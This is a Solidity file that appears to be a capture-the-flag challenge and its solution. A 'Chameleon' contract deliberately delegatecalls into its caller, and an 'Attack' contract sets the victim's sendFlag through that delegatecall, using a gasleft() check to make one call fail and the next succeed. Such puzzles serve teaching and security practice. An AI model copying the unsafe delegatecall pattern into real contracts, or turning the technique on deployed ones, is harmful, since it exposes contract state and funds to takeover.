pragma solidity ^0.5.17;

contract Chameleon {
    uint randomNumber = 0;
    bool public sendFlag = false;
    
    function HideAndSeek() public {
        bool success;
        (success,) = msg.sender.delegatecall(abi.encodeWithSignature(""));
        require(!success);
        (success,) = msg.sender.delegatecall(abi.encodeWithSignature(""));
        require(success);
    }
}

contract Attack {
    uint randomNumber;
    bool public sendFlag;
    Chameleon victim;
    constructor() public {

    }
    
    function() external { 
        sendFlag = true;
        uint x;
        assembly {
            x := add(2, 3)
        }
        if (gasleft() % 3 == 2) {
            revert();
        }
    }
    
    function attack(address addr) public {
        victim = Chameleon(addr);
        victim.HideAndSeek();
    }
}
